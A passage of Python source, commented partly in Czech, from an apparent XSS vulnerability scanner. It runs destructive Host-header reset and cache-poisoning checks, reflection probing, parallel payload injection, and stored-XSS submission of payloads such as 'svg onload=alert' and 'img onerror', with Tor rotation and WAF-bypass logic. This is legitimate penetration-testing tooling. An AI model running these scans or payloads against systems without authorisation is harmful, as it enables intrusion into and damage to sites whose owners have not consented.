                            f"{list(f.get('cache_indicators', {}).keys())}"
                        ),
                    })
            else:
                cb["on_log"](
                    "[DESTRUCTIVE/cache] No cache poisoning detected.",
                    "info",
                )
        except Exception as _ce:
            cb["on_log"](f"[DESTRUCTIVE/cache] failed: {_ce}", "warning")

        # 2) Host Header Reset (jen pokud máme test_email)
        if destructive_test_email:
            try:
                cb["on_phase"]("destructive-hosthdr",
                                {"url": target,
                                 "email": destructive_test_email})
                hh_findings = host_header_reset_scan(
                    session_main, target, destructive_test_email,
                    timeout=timeout, on_log=cb.get("on_log"),
                )
                if hh_findings:
                    cb["on_log"](
                        f"[DESTRUCTIVE/hosthdr] Found "
                        f"{len(hh_findings)} reset vector(s) — "
                        f"CHECK INBOX!", "warning",
                    )
                    for f in hh_findings:
                        cb["on_hit"]({
                            "url": f["url"],
                            "param": "Host header",
                            "payload": f.get("evil_host", ""),
                            "context": "host-header-injection",
                            "source": "destructive-hosthdr",
                            "severity": f["severity"],
                            "cwe_hint": f.get("cwe", "CWE-20"),
                            "destructive_finding": f,
                            "evidence": (
                                f"test_email={f.get('test_email')} "
                                f"status={f.get('response_status')}"
                            ),
                        })
                else:
                    cb["on_log"](
                        "[DESTRUCTIVE/hosthdr] No reset injection "
                        "detected.", "info",
                    )
            except Exception as _ce:
                cb["on_log"](
                    f"[DESTRUCTIVE/hosthdr] failed: {_ce}", "warning",
                )
        else:
            cb["on_log"](
                "[DESTRUCTIVE/hosthdr] Skipped — no test_email "
                "provided (would need verified inbox under "
                "pentester control).", "info",
            )

        # 3) Stored XSS via headers
        try:
            cb["on_phase"]("destructive-storedhdr", {"url": target})
            sh_findings = stored_xss_headers_scan(
                session_main, target, timeout=timeout,
                on_log=cb.get("on_log"),
            )
            if sh_findings:
                for f in sh_findings:
                    _confirmed = f.get("confirmed", False)
                    _sev = f.get("severity", "info")
                    if _confirmed:
                        _ctx = "stored-xss-via-headers (confirmed)"
                        _ev = (f"CONFIRMED reflected in executable context "
                               f"via {','.join(f.get('affected_headers', []))}")
                    else:
                        _ctx = "stored-xss-via-headers (unconfirmed)"
                        _ev = f.get("description", "submitted, manual verify")[:160]
                    cb["on_hit"]({
                        "url": f["url"],
                        "param": "Multiple headers (Referer/UA/XFF/...)",
                        "payload": str(f.get("evidence_nonce",
                                             f.get("payloads_submitted", "")))[:200],
                        "context": _ctx,
                        "source": "destructive-storedhdr",
                        "severity": _sev,
                        "cwe_hint": f.get("cwe", "CWE-79"),
                        "destructive_finding": f,
                        "evidence": _ev,
                    })
        except Exception as _ce:
            cb["on_log"](
                f"[DESTRUCTIVE/storedhdr] failed: {_ce}", "warning",
            )


    if canary:
        # v10.16: dřív náhodný vzorek (rsample) — mohl minout high-signal
        # payloady. Teď deterministický CHYTRÝ výběr: polyglot + self-firing
        # jádro + reprezentanti všech kontextů. Stejný počet requestů, ale
        # výrazně vyšší šance na záchyt. Respektuje uživatelský payload set.
        payloads = build_fast_payload_set(payloads, budget=25)
        cb["on_log"](
            f"FAST/CANARY mode: {len(payloads)} high-signal payloads "
            f"(smart selection — polyglot + per-context representatives).",
            "info")

    if limit_payloads:
        payloads = payloads[:limit_payloads]
        cb["on_log"](f"Payload count limited to {len(payloads)} (--limit-payloads).", "info")

    # ══════════════════════════════════════════════════════════════════════════
    # ── PRE-SCAN REFLECTION PROBE ────────────────────────────────────────────
    # ══════════════════════════════════════════════════════════════════════════
    # Před generováním desítek tisíc úloh pošleme na každý (url, param) jeden
    # neškodný marker. Podle výsledku rozhodneme:
    #
    #   Nereflektuje vůbec      → skip (parametr se neodráží, 0% šance na XSS)
    #   Reflektuje escapovaný   → skip POKUD žádný WAF (server sanitizuje správně)
    #   Reflektuje escapovaný   → POKRAČUJ pokud WAF (WAF bypass payloady můžou projít)
    #   Reflektuje raw          → POKRAČUJ plnou sadou
    #   WAF block (403/302)     → POKRAČUJ (fuzzer/context payloady můžou obejít)
    #   Timeout/error           → POKRAČUJ (nedokážeme rozhodnout)
    #
    # Tohle typicky eliminuje 60-80% zbytečných kombinací bez ztráty pokrytí.
    # ══════════════════════════════════════════════════════════════════════════

    session_probe = make_session(verify_ssl=verify_ssl, rotate_ua=rotate_ua,
                                 user_agents=user_agents, proxies=proxies,
                                 cffi_impersonate=cffi_impersonate,
                                 legacy_tls=legacy_tls)
    session_probe._tor_rotate_every = tor_rotate_every  # type: ignore[attr-defined]
    session_probe._scan_intensity = scan_intensity  # type: ignore[attr-defined]
    _bind_cancel_to_session(session_probe, _cancelled)  # responsive Stop

    # v10.16 OPRAVA: seed fáze se NIKDY nepřeskakuje na základě checkpointu.
    # Seed = JÁDRO reflected-XSS skenu. Dřívější "skip seed při resume" sice
    # šetřil čas, ale když byl checkpoint stale/neúplný (typicky po crashi),
    # přeskočil celý hlavní sken → masivní ztráta detekce. Bezpečnost detekce
    # > úspora času. Checkpoint dál UKLÁDÁ nálezy (přežijí pád), jen už
    # nepřeskakuje seed. Crawl (idempotentní) se přeskočit smí (řešeno výš).
    _seed_from_ckpt = False
    candidates: List[Dict] = []
    found_params:  Set[Tuple[str, str]] = set()

    # Sbírej unikátní (url, param) páry
    all_pairs: List[Tuple[str, str]] = []
    seen_probe_pairs: set = set()
    for url_p in param_urls:
        qs_p = parse_qs(urlparse(url_p).query, keep_blank_values=True)
        for param_p in qs_p.keys():
            key_p = (url_p, param_p)
            if key_p not in seen_probe_pairs:
                seen_probe_pairs.add(key_p)
                all_pairs.append(key_p)

    skip_params: Set[Tuple[str, str]] = set()  # (url, param) které přeskočíme

    if all_pairs and len(payloads) > 30 and not _seed_from_ckpt:
        # Probe má smysl jen pokud je dost payloadů (jinak overhead > úspora)
        cb["on_log"](f"Pre-scan probe: testing {len(all_pairs)} parameters for reflection...", "info")
        cb["on_phase"]("probe", {"total": len(all_pairs)})

        probe_done = 0
        probe_reflected = 0
        probe_escaped = 0
        probe_noreflect = 0
        probe_waf = 0
        probe_errors = 0

        # Jednoduchý WAF cache per host z předchozí CSP fáze
        waf_hosts_early: Set[str] = set()

        with _bar(len(all_pairs), title="Pre-scan probe", spinner="dots") as bar:
            for url_pr, param_pr in all_pairs:
                if _cancelled.is_set():
                    break
                bar()
                probe_done += 1
                if probe_done % 10 == 0:
                    cb["on_progress"](probe_done, len(all_pairs))

                probe_marker = random_marker(12)
                test_url_pr = inject_into_params(url_pr, param_pr, probe_marker)
                if not test_url_pr:
                    continue

                try:
                    r_pr = session_probe.get(test_url_pr, timeout=timeout,
                                              allow_redirects=follow_redirects)
                    body_pr = r_pr.text or ""
                    status_pr = r_pr.status_code

                    # WAF detekce na probe response
                    waf_pr = fingerprint_waf(r_pr)
                    pr_host = urlparse(url_pr).hostname or ""
                    if waf_pr:
                        waf_hosts_early.add(pr_host)

                    if probe_marker in body_pr:
                        # Marker se odráží — ale jak?
                        # Marker je alfanumerický, takže sám o sobě nebude escapovaný.
                        # Pošleme quick test s < > znaky abychom zjistili zda server sanitizuje.
                        angle_test = f"{probe_marker}<xg>"
                        test_url_angle = inject_into_params(url_pr, param_pr, angle_test)
                        if test_url_angle:
                            try:
                                r_angle = session_probe.get(test_url_angle, timeout=timeout,
                                                             allow_redirects=follow_redirects)
                                body_angle = r_angle.text or ""

                                if angle_test in body_angle:
                                    # < > prošly raw → plná reflexe, POKRAČUJ
                                    probe_reflected += 1
                                elif f"{probe_marker}&lt;xg&gt;" in body_angle:
                                    # < > escapovány → server sanitizuje
                                    if pr_host in waf_hosts_early:
                                        # WAF přítomen → POKRAČUJ (bypass možný)
                                        probe_waf += 1
                                    else:
                                        # Čistý escape bez WAF → skip
                                        skip_params.add((url_pr, param_pr))
                                        probe_escaped += 1
                                else:
                                    # Nejednoznačné → POKRAČUJ (bezpečnější)
                                    probe_reflected += 1
                            except _NET_EXCEPTIONS:
                                probe_reflected += 1  # při chybě pokračuj
                        else:
                            probe_reflected += 1
                    else:
                        # Marker se vůbec neodráží → skip
                        # ALE: pokud WAF blokuje (403/302), pokračuj
                        if status_pr in (403, 406, 301, 302, 303, 307) or waf_pr:
                            probe_waf += 1
                        else:
                            skip_params.add((url_pr, param_pr))
                            probe_noreflect += 1

                except _NET_EXCEPTIONS:
                    probe_errors += 1
                    # Při chybě pokračuj — nemůžeme rozhodnout

                if sleep_between > 0:
                    time.sleep(sleep_between)

        original_pairs = len(all_pairs)
        skipped = len(skip_params)
        remaining = original_pairs - skipped
        cb["on_log"](
            f"[OK] Pre-scan probe done: {original_pairs} parameters → "
            f"{remaining} active ({skipped} skipped)\n"
            f"   raw reflexe: {probe_reflected} | escaped (skip): {probe_escaped} | "
            f"nereflektuje (skip): {probe_noreflect} | WAF (keep): {probe_waf} | "
            f"chyby (keep): {probe_errors}",
            "info"
        )

    # ── Generování úloh ───────────────────────────────────────────────────────
    # Přeskočíme (url, param) páry které probe označil jako dead
    tasks = []
    if not _seed_from_ckpt:
        for url_t in param_urls:
            qs_t = parse_qs(urlparse(url_t).query, keep_blank_values=True)
            if not qs_t:
                continue
            for param_t in qs_t.keys():
                if (url_t, param_t) in skip_params:
                    continue  # Pre-scan probe: nereflektuje nebo escapuje
                for payload_t in payloads:
                    marker_t = random_marker(12) if marker_enabled else ""
                    tasks.append((url_t, param_t, payload_t, marker_t))

    total = len(tasks)
    if skip_params:
        cb["on_log"](f"Total tasks after probe filtering: {total}", "info")
    else:
        cb["on_log"](f"Total tasks (URL × payloads): {total}", "info")
    if total == 0:
        cb["on_log"]("No testable parameters after the pre-scan probe. They all escape or don't reflect.", "info")
        # Pokračuj na další fáze (POST, fuzz, ...) — ty mají vlastní logiku
        # ale seed fázi přeskoč
        tasks = []

    cb["on_phase"]("scan", {"total": total})

    # ══════════════════════════════════════════════════════════════════════════
    # ── CIRCUIT BREAKER ──────────────────────────────────────────────────────
    # ══════════════════════════════════════════════════════════════════════════
    # Sdílené počítadlo consecutive failures. Pokud překročí threshold,
    # scan se zastaví a provede health probe. Pokud probe selže → kill fázi.
    # ══════════════════════════════════════════════════════════════════════════

    _consecutive_failures = [0]  # mutable list pro sdílení přes thready
    _failure_lock = Lock()
    _circuit_broken = [False]
    CIRCUIT_BREAKER_THRESHOLD = 30  # 30 po sobě jdoucích failures
    CIRCUIT_BREAKER_PROBE_RETRIES = 3

    def _record_success():
        with _failure_lock:
            _consecutive_failures[0] = 0

    def _record_failure() -> bool:
        """Vrátí True pokud circuit breaker vypadl (= zastavit scan)."""
        with _failure_lock:
            _consecutive_failures[0] += 1
            if _consecutive_failures[0] >= CIRCUIT_BREAKER_THRESHOLD and not _circuit_broken[0]:
                _circuit_broken[0] = True
                return True
        return False

    def _check_circuit_broken() -> bool:
        with _failure_lock:
            return _circuit_broken[0]

    def _health_probe(session_hp, target_hp, timeout_hp) -> bool:
        """Pošle jednoduchý GET na target. Vrátí True pokud server odpovídá.

        FAIL-SAFE: catches EVERY exception, not just network ones. A struggling
        server can return a malformed response whose non-ASCII header/cookie the
        HTTP stack decodes and raises UnicodeDecodeError (not a RequestException)
        — that must count as an unhealthy probe, never crash the whole scan.
        """
        for attempt in range(CIRCUIT_BREAKER_PROBE_RETRIES):
            try:
                r_hp = session_hp.get(target_hp, timeout=timeout_hp)
                if r_hp.status_code < 500:
                    with _failure_lock:
                        _consecutive_failures[0] = 0
                        _circuit_broken[0] = False
                    return True
            except Exception:
                time.sleep(2 * (attempt + 1))
        return False

    def _phase_target_alive(phase_name: str) -> bool:
        """Lightweight pre-phase check (used by STATIC_JS / PP / TT / DOM_V6 /
        headless phases). Single GET to target. If dead, log once and skip
        the phase instead of generating one error per URL.

        Returns True if target responds, False otherwise."""
        try:
            r_hp = session_workers.get(target, timeout=min(timeout, 5.0))
            if r_hp is None or r_hp.status_code >= 500:
                cb["on_log"](
                    f"[{phase_name}] target unavailable "
                    f"(HTTP {r_hp.status_code if r_hp else 'no response'}) — "
                    f"skipping the phase", "warn"
                )
                return False
            return True
        except Exception as e:
            # FAIL-SAFE: any exception (incl. a UnicodeDecodeError from a
            # malformed non-ASCII response header/cookie) means "skip this phase",
            # never crash the scan.
            err_str = str(e)
            if "Connection refused" in err_str or "NewConnectionError" in err_str:
                cb["on_log"](
                    f"[{phase_name}] target is not reachable (Connection "
                    f"refused) — it probably went down under load. Skipping "
                    f"the phase and continuing with the others.", "warn"
                )
            else:
                cb["on_log"](
                    f"[{phase_name}] health probe failed: "
                    f"{type(e).__name__} — skipping the phase", "warn"
                )
            return False

    # ── Seed scanning (paralelní) ─────────────────────────────────────────────
    # Pokud tor_isolate_workers=True, každý worker by měl mít vlastní proxy
    # (socks5h://xsg_wN:x@... pro izolaci okruhu). V současné architektuře
    # sdílejí session — izolace je na TODO. Pro teď sdílená session s
    # globální Tor rotací každých tor_rotate_every requestů.
    if tor_isolate_workers and get_tor_controller() is not None:
        logging.warning(
            "[!]️  --tor-isolate-workers: in the current architecture the workers share "
            "one session. Full per-worker isolation requires a refactor of the ThreadPool "
            "executor — watch a future release."
        )
    # v10.15: pool_size musí pokrýt počet workerů. GUI omezuje threads na
    # 100 (= POOL_SIZE), ale CLI --thread nemá horní limit — při --thread 500
    # by se 500 workerů pralo o 100 spojení → urllib3 "Connection pool is
    # full, discarding connection", degradace keep-alive a propustnosti.
    # Odvodíme pool od workers (min. POOL_SIZE, ať se malé scany nezhorší).
    _worker_pool_size = max(POOL_SIZE, workers)
    session_workers = make_session(pool_size=_worker_pool_size,
                                    verify_ssl=verify_ssl, rotate_ua=rotate_ua,
                                    user_agents=user_agents, proxies=proxies,
                                    cffi_impersonate=cffi_impersonate,
                                    legacy_tls=legacy_tls)
    session_workers._tor_rotate_every = tor_rotate_every  # type: ignore[attr-defined]
    session_workers._scan_intensity = scan_intensity  # type: ignore[attr-defined]
    _bind_cancel_to_session(session_workers, _cancelled)  # responsive Stop

    # v10.52: return the HTML of a crawled page, reusing the crawl-time cache so
    # the downstream page-analysis phases (mutation / postMessage / websocket /
    # static-js / trusted-types / blind) don't re-download pages the crawler
    # already fetched. Cache hit → instant (no request). Cache miss → a plain
    # 200-only fetch via session_workers (identical to what those phases did).
    # Returns the HTML string, or None if the page is unavailable.
    def _crawl_html(_u: str) -> Optional[str]:
        _c = _crawl_html_cache.get(_u)
        if _c is not None:
            return _c
        try:
            _r = session_workers.get(_u, timeout=timeout, allow_redirects=True)
        except Exception:
            return None
        if _r is None or not hasattr(_r, "status_code") or _r.status_code >= 400:
            return None
        # v10.88: same decoding as the crawl-time cache fill. Otherwise the SAME
        # page is analysed as correct UTF-8 when cached and as ISO-8859-1
        # mojibake when not — the analysis phases would see two different
        # documents depending purely on cache membership.
        return _decode_response(_r)

    # ════════════════════════════════════════════════════════════════════════
    # v2 EMIT STATE — reset dedup + activate render gate for THIS scan run
    # ════════════════════════════════════════════════════════════════════════
    # Active render gate sends 1 extra HTTP probe per *unique* candidate
    # finding (deduped first) with multi-encoded markers. Confirms whether
    # the breakout primitive survives sanitization. Cost: ~1 req per finding.
    reset_emit_state(active_render_gate=True,
                      session=session_workers,
                      timeout=max(3.0, timeout))
    cb["on_log"]("[GATE] v2 emit chokepoint armed: dedup + gate + active render probe", "info")
    # v10.77: now that the emit state is armed (and reset), re-seat any findings
    # restored from a checkpoint into it, so they reach the report + CI gate and
    # seed the dedup set (preventing double-emit when the seed re-run rediscovers
    # them). Previously restored findings were silently dropped from all reports.
    if _resumed_findings:
        _n_reseed = _reseed_resumed_findings(_resumed_findings, cb)
        if _n_reseed:
            cb["on_log"](f"[RESUME] {_n_reseed} restored findings added to the report + CI gate", "info")
    # ════════════════════════════════════════════════════════════════════════

    # v10.16: found_params už inicializován výš (před resume guardem) a
    # případně obnoven z checkpointu — tady ho NEPŘEPISUJEME.
    found_lock   = Lock()
    print_lock   = Lock()
    cand_lock    = Lock()
    results:     List[Dict] = []
    # v10.16: NEpřepisuj candidates když jsme je obnovili z checkpointu
    # (jinak by je context-aware fáze dostala prázdné). Při normálním běhu
    # v10.16: candidates už je inicializován výš (před resume guardem) a
    # případně obnoven z checkpointu — tady ho NEPŘEPISUJEME, jinak bychom
    # smazali obnovené hodnoty i čerstvý prázdný seznam zbytečně reinicializovali.
    waf_seen:    Set[str]   = set()
    waf_seen_lock            = Lock()
    waf_by_host: Dict[str, Dict] = {}   # host -> waf dict pro enrichment výsledků
    completed    = 0
    progress_lock = Lock()

    start = time.perf_counter()

    if tasks:
      with _bar(total, title="Testuji XSS", spinner="dots") as bar:
        with ThreadPoolExecutor(max_workers=workers) as exe:
            # v10.15: BOUNDED SUBMISSION — dříve se všechny tasky
            # materializovaly naráz (`futures = [exe.submit(...) for t in
            # tasks]`). Na širokých cílech je tasks = url×param×payload
            # klidně 100k+ úloh → velký paměťový sken na startu fáze a
            # dlouhá prodleva, než se objeví první progress. Teď držíme
            # jen omezené okno in-flight futures a dosubmitováváme nové,
            # jak se dokončují. Per-future zpracování (circuit breaker,
            # results, bar, progress, cancel) je beze změny.
            _max_inflight = max(workers * 4, workers + 1)
            _task_iter = iter(tasks)
            _inflight = set()

            def _submit_next() -> bool:
                """Submitne jeden další task. False když je iterátor vyčerpaný."""
                for _t in _task_iter:
                    _inflight.add(exe.submit(
                        worker_task,
                        session_workers, _t, timeout, sleep_between,
                        found_params, found_lock, early_exit, print_lock,
                        marker_param, verbose, follow_redirects,
                        candidates, cand_lock, csp_result,
                        waf_seen, waf_seen_lock,
                        waf_by_host,
                        cb,
                        _cancelled          # bail queued tasks instantly on Stop
                    ))
                    return True
                return False

            # Naplň počáteční okno
            for _ in range(_max_inflight):
                if not _submit_next():
                    break

            _abort = False
            while _inflight and not _abort:
                _done, _pending = wait(_inflight, return_when=FIRST_COMPLETED)
                _inflight = set(_pending)
                for fut in _done:
                    if _cancelled.is_set():
                        _abort = True
                        break

                    # ── Circuit breaker check ────────────────────────────────
                    if _check_circuit_broken():
                        cb["on_log"](
                            f"[!] Circuit breaker: {CIRCUIT_BREAKER_THRESHOLD} consecutive "
                            f"failures. Testing server health...", "warn"
                        )
                        server_alive = _health_probe(session_workers, target, timeout)
                        if not server_alive:
                            cb["on_log"](
                                "[!!] Server not responding after the health probe — ending the seed phase.\n"
                                "   Tip: the server is probably throttling/blocking you. "
                                "Zkus --sleep 1 nebo --proxy.", "error"
                            )
                            _abort = True
                            break
                        else:
                            cb["on_log"]("[OK] Server responding — continuing (circuit breaker reset)", "info")

                    try:
                        res = fut.result()
                        if res is _REQUEST_FAILED:
                            tripped = _record_failure()
                            if tripped:
                                logging.debug("Circuit breaker tripped from worker REQUEST_FAILED")
                        elif res:
                            _record_success()
                            test_url, param, status, body_len, waf = (res + (None,))[:5] if len(res) < 5 else res
                            results.append({"url": test_url, "param": param, "status": status, "body_len": body_len, "source": "seed", "waf": waf, "context": ""})
                        else:
                            # None = normální "nenašel reflexi" — ne failure
                            _record_success()  # server odpověděl, jen nereflektoval
                    except _NET_EXCEPTIONS:
                        tripped = _record_failure()
                        if tripped:
                            logging.debug("Circuit breaker tripped from future exception")
                    except Exception as e:
                        logging.debug(f"Task exception: {e}")
                    finally:
                        bar()
                        with progress_lock:
                            completed += 1
                        cb["on_progress"](completed, total)

                    # Doplň okno — náhrada za právě dokončený task
                    _submit_next()

            if _abort:
                # Zruš zbývající in-flight; nesubmitnuté tasky se už nesubmitnou.
                for f in _inflight:
                    f.cancel()

    elapsed = time.perf_counter() - start
    rate    = total / elapsed if elapsed > 0 else 0
    cb["on_log"](f"[OK] Seed phase done: {total} requests | {len(found_params)} hits | {len(candidates)} candidates | {elapsed:.1f}s | {rate:.1f} req/s", "info")
    # v10.16: checkpoint po seed fázi — ulož potvrzené nálezy (+ resumed),
    # ať po pádu během pozdějších fází (context/dom/static-js) nezmizí.
    if _ckpt is not None:
        try:
            # v10.77: resumed findings are now re-seated INTO _emitted_hits, so
            # get_emitted_hits() already contains them — concatenating
            # _resumed_findings again would double them and grow the checkpoint
            # each resume cycle. Save the deduped emit state as-is.
            _ckpt.set_findings(get_emitted_hits())
            # v10.16: ulož i výstup seed fáze (candidates + found_params), ať
            # ji lze při resume PŘESKOČIT místo opakování 4605 requestů.
            # candidates konzumuje context-aware fáze, takže musí přežít.
            _ckpt.mark_phase_done("seed", {
                "candidates": candidates,
                "found_params": [list(k) if isinstance(k, tuple) else k
                                 for k in found_params],
            })
        except Exception as _cke:
            _swallow(_cke, "checkpoint save after seed phase")

    if _cancelled.is_set():
        cb["on_log"]("[STOP] Scan stopped by the user.", "info")
        try:
            _eh = len(get_emitted_hits())
        except Exception:
            _eh = len(found_params)
        cb["on_phase"]("done", {"hits": max(_eh, len(found_params)), "elapsed": time.perf_counter() - start})
        return list(found_params)

    # ── POST sken ─────────────────────────────────────────────────────────────
    if enable_post_scan and not _cancelled.is_set():
        post_targets = list(set(
            [urlunparse(urlparse(u)._replace(query="", fragment="")) for u in param_urls] + [target]
        ))
        cb["on_log"](f"POST scan: {len(post_targets)} pages × {len(payloads)} payloads", "info")
        cb["on_phase"]("post", {"total": len(post_targets) * len(payloads)})

        post_total = len(post_targets) * len(payloads)
        post_done  = 0

        with _bar(post_total, title="POST sken", spinner="dots") as bar:
            for page_url in post_targets:
                page_r    = _fetch_with_tor_retry(session_workers, page_url, timeout, follow_redirects=follow_redirects, max_attempts=2)
                page_html = (page_r.text or "") if page_r else ""
                for payload in payloads:
                    bar()
                    post_done += 1
                    cb["on_progress"](post_done, post_total)
                    if not page_html: continue
                    for f in inject_post_params(session_workers, page_url, page_html, payload, timeout, follow_redirects):
                        key = (f["action"], f["param"])
                        with found_lock:
                            already = key in found_params
                            found_params.add(key)
                        # v10.9: only append unique (action, param) pairs to JSON
                        # results — previously every payload × every param =
                        # 12k+ entries of duplicated data. Dedup-at-source
                        # mirrors what emit gate does for GUI.
                        if not already:
                            results.append({
                                "url": f["action"], "param": f["param"],
                                "status": f.get("status"),
                                "body_len": f.get("response_len"),
                                "source": "post", "payload": payload,
                            })
                            _emit_hit(cb, {
                                "url": f["action"], "param": f["param"],
                                "context": "POST",
                                "csp_note": csp_affects_finding(csp_result, None),
                                "source": "post", "payload": payload,
                            }, body=f.get("response_body") or f.get("body"),
                               resp_headers=f.get("response_headers"))
                if sleep_between > 0: time.sleep(sleep_between)
        cb["on_log"](f"[OK] POST scan done: {len([r for r in results if r.get('source') == 'post'])} findings", "info")

    # ── Stored XSS sken ──────────────────────────────────────────────────────
    # Pošleme payload s unikátním markerem do POST formulářů a pak navštívíme
    # "listing/detail" URL — pokud se tam marker objeví, máme stored XSS.
    # Na rozdíl od POST fáze (která čte response ihned), stored fáze
    # kontroluje JINÉ URL — kam se data po uložení zobrazí.
    # ── Stored XSS round-trip (v9): inicializuj registry před stored fází ──
    # Registry se naplňuje při existující v8 stored fázi (níže) a vlastní
    # round-trip canary přidá navíc unikátní XSGS_ token. Po skenu round-trip
    # fáze re-crawluje a hledá tyto canaries v jiných URL.
    sx_registry = None
    if (_STORED_TRACKER_AVAILABLE and stored_roundtrip
            and not _cancelled.is_set()):
        sx_registry = _SXRegistry()

    if enable_stored_scan and not _cancelled.is_set():
      try:
        # Sestav seznam POST cílů — stránky s formuláři.
        # v10.36: NEJEN param_urls (stránky s GET parametry) — i všechny
        # crawlované `pages`. Jinak se míjely stránky s POST formulářem BEZ
        # query stringu (přesně Google XSS-game level-2 /level2/frame, a spousta
        # reálných appek). inject_post_for_stored stejně postuje jen tam, kde
        # POST formulář reálně je, takže přidání pages je bezpečné.
        def _strip_qf(u):
            return urlunparse(urlparse(u)._replace(query="", fragment=""))
        stored_post_targets = list(set(
            [_strip_qf(u) for u in param_urls]
            + [_strip_qf(u) for u in (pages or [])]
            + [target]
        ))

        # Sestav seznam URL k verifikaci — kde hledat marker po uložení
        # Pokud uživatel zadal stored_verify_urls, použij ty. Jinak použij
        # všechny crawlované stránky (nejširší záchytná síť).
        verify_urls = stored_verify_urls or (pages if pages else stored_post_targets)
        # Deduplikace
        verify_urls = list(set(verify_urls))

        # v10.37: rozbal same-origin iframy → formuláře v iframe (level-2 /frame,
        # widgety) zaberou i při crawl_depth=0 / resume, kdy crawl frame nenásledoval.
        try:
            _iframe_extra = _expand_iframe_targets(
                session_workers, stored_post_targets,
                urlparse(target).hostname or "", timeout, follow_redirects)
            if _iframe_extra:
                stored_post_targets = list(set(stored_post_targets) | _iframe_extra)
                verify_urls = list(set(verify_urls) | _iframe_extra)
                cb["on_log"](f"[STORED] iframe expansion: +{len(_iframe_extra)} "
                             f"frame target(s) (forms in iframe)", "info")
        except Exception:
            pass

        cb["on_log"](f"Stored XSS scan: {len(stored_post_targets)} POST targets → {len(verify_urls)} verify URLs", "info")
        cb["on_phase"]("stored", {"post_targets": len(stored_post_targets), "verify_urls": len(verify_urls)})

        # Pro stored XSS stačí pár payloadů (chceme markeré, ne variance)
        stored_payloads = [
            # v10.35: marker je i UVNITŘ alert(...) → po dosazení XSS→marker
            # vystřelí alert("<marker>") = jednoznačný headless kanárek
            # (innerHTML/level-2 exekuci pak potvrdí reálný render, ne jen HTTP).
            'XSS<svg onload=alert("XSS")>',
            'XSS"><img src=x onerror=alert("XSS")>',
            'XSS"><details open ontoggle=alert("XSS")>',   # moderní carrier
            'XSS<script>alert("XSS")</script>',            # server-side reflexe
        ]

        stored_hits = 0
        submitted_markers: List[Dict] = []  # [{marker, action, param, payload}]

        # Fáze 1: Odešli payloady s markery
        with _bar(len(stored_post_targets) * len(stored_payloads), title="Stored POST", spinner="dots") as bar:
            for page_url in stored_post_targets:
                if _cancelled.is_set():
                    break
                page_r    = _fetch_with_tor_retry(session_workers, page_url, timeout, follow_redirects=follow_redirects, max_attempts=2)
                page_html = (page_r.text or "") if page_r else ""
                if not page_html:
                    # Stránka se nenačetla — skip
                    for _ in stored_payloads:
                        bar()
                    continue

                for payload in stored_payloads:
                    bar()
                    if _cancelled.is_set():
                        break
                    marker = "SXSS" + random_marker(10)
                    submitted_for_this = inject_post_for_stored(
                        session_workers, page_url, page_html,
                        payload, marker, timeout, follow_redirects
                    )
                    for f in submitted_for_this:
                        submitted_markers.append(f)
                        # ── v9 round-trip: registruj marker do registry ──
                        # Hunt fáze ho najde i mimo verify_urls (admin pages,
                        # libovolné stránky s reflected canary).
                        if sx_registry is not None:
                            try:
                                # v10.80: register the PER-FIELD marker actually
                                # written into the POST body (f["marker"] = base +
                                # 4-char suffix), NOT the base marker. Registering
                                # the base meant the hunt could never find the token
                                # that's really in the response → wrong-endpoint
                                # miss. Falls back to base if a finding lacks one.
                                sx_registry.register(f.get("marker", marker), _SXOrigin(
                                    url=f.get("action", page_url),
                                    param=f.get("param", "?"),
                                    method="POST",
                                    payload=f.get("payload", payload),
                                ))
                            except Exception:
                                pass

                if sleep_between > 0:
                    time.sleep(sleep_between)

        cb["on_log"](f"  → Sent {len(submitted_markers)} marked POST requests", "info")

        # Čekej grace period pro DB commit / async processing
        if submitted_markers and stored_wait_secs > 0:
            cb["on_log"](f"  → Waiting {stored_wait_secs}s (DB commit / async processing)...", "info")
            time.sleep(stored_wait_secs)

        # Fáze 2: Verifikuj na listing/detail URL
        # v10.35: stored se potvrzuje i REÁLNÝM renderem ve headless Chromiu —
        # HTTP `marker in body` nevidí klientskou innerHTML exekuci (level-2 typ).
        _stored_hv = None
        _stored_hv_cm = None
        _stored_pw_cookies = None
        if headless_verify and _HEADLESS_VERIFIER_AVAILABLE and _HV is not None:
            try:
                _stored_hv_cm = _HV(timeout_s=12.0, framework_wait_ms=1500,
                                    screenshot=False)
                _stored_hv = _stored_hv_cm.__enter__()
                if not getattr(_stored_hv, "available", False):
                    _stored_hv = None
                else:
                    _stored_pw_cookies = _requests_cookies_to_pw(
                        session_workers, target)
                    cb["on_log"]("[STORED] headless confirmation enabled "
                                 "(real render view of pages)", "info")
            except Exception:
                _stored_hv = None
        try:
          # v10.52 PERF: fetch every verify_url ONCE and check ALL markers in it
          # (was: re-fetch all verify_urls per marker = O(markers × urls) GETs).
          _stored_markers = [sub["marker"] for sub in submitted_markers]
          _stored_batch = verify_stored_xss_batch(
              session_workers, _stored_markers, verify_urls,
              timeout=timeout, follow_redirects=follow_redirects,
              workers=workers, cancel_event=_cancelled)
          with _bar(len(submitted_markers) * len(verify_urls), title="Stored verify", spinner="dots") as bar:
            for sub in submitted_markers:
                if _cancelled.is_set():
                    break
                marker = sub["marker"]
                hits = _stored_batch.get(marker, [])
                for _ in verify_urls:
                    bar()

                if not hits:
                    continue

                # Stored XSS nalezeno!
                for hit in hits:
                    key = (sub["action"], sub["param"])
                    with found_lock:
                        already = key in found_params
                        found_params.add(key)

                    results.append({
                        "url":         sub["action"],
                        "param":       sub["param"],
                        "status":      sub["status"],
                        "source":      "stored",
                        "payload":     sub["payload"],
                        "marker":      marker,
                        "view_url":    hit["view_url"],
                        "view_status": hit["status"],
                        "context":     hit["context"],
                    })
                    if not already:
                        stored_hits += 1
                        _hd = {
                            "url":      sub["action"],
                            "param":    sub["param"],
                            "context":  f"STORED → {hit['context']} on {hit['view_url'][:60]}",
                            "csp_note": csp_affects_finding(csp_result, hit["context"]),
                            "status":   sub["status"],
                            "source":   "stored",
                            "payload":  sub["payload"],
                            "view_url": hit["view_url"],
                        }
                        # v10.35: reálný render → potvrzení innerHTML exekuce
                        if _stored_hv is not None:
                            _ok, _vd = _confirm_stored_headless(
                                _stored_hv, hit["view_url"], marker,
                                cookies=_stored_pw_cookies)
                            _apply_headless_verdict(
                                _hd, executed=_ok,
                                status=(_vd.status.value if _vd else "skipped"),
                                kind="stored",
                                evidence=(getattr(_vd, "evidence", "") if _vd else ""))
                            if _ok:
                                cb["on_log"](
                                    f"[STORED ✓ CONFIRMED] {hit['view_url']} — "
                                    f"canary fired in real browser (proven TP)",
                                    "info")
                        _emit_hit(cb, _hd, body=hit.get("body"),
                                  resp_headers=hit.get("response_headers"))
